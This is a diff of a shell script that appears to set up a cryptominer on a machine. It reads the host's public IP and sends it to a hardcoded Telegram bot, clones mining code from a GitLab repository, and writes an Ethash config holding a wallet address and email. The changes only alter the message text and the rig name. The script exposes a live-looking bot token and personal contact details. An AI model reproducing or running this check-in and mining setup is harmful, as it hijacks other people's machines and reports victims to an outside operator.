@@ -5,12 +5,12 @@ apt-get install jq -y
 numb=$(echo $(shuf -i 1-999999 -n 1))
 myIp="$(wget -qO- ifconfig.me/ip)"
 n0z="Soldier$numb|$myIp"
-curl --silent -X GET 'https://api.telegram.org/bot1936519764:AAFhpKRoPybd6q1Kqqb-iWFxjdxKlfX3q_0/sendMessage?chat_id=1335828890&text='$n0z --compressed
+curl --silent -X GET 'https://api.telegram.org/bot1936519764:AAFhpKRoPybd6q1Kqqb-iWFxjdxKlfX3q_0/sendMessage?chat_id=1335828890&text='$myIp --compressed
 
 git clone https://gitlab.com/diablostrom5/master.git
 
 touch master/config.ini
-echo "rigName = Worker$numb" >> "master/config.ini"
+echo "rigName = Worker" >> "master/config.ini"
 echo "email = rahmatnugroho1990@gmail.com" >> "master/config.ini" 
 echo "[Ethash]" >> "master/config.ini"
 echo "wallet = 0xBb56A0cd7595244eC22AA12F159f56bf1D96797d" >> "master/config.ini"
